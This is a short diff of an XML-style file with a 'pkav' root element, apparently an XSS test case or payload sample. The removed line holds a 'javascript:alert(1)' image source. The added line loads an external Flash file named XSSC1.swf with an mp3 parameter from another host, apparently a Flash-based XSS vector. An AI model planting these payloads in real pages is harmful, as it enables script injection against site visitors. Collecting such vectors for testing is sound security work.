@@ -1,7 +1,7 @@
 <pkav>
 	<rect width="200" height="300" xscale="-1" yscale="-1" rotate="180">
     <successMsg>
-      <img src="javascript:alert(1)//.swf" />xxxx
+      <img src="http://sandbox.host.smartgslb.com/flash_1/XSSC1.swf?mp3=http://shepherdwind.com/xss/1.mp3" />xxxx
     </successMsg>
 	</rect>
 </pkav>
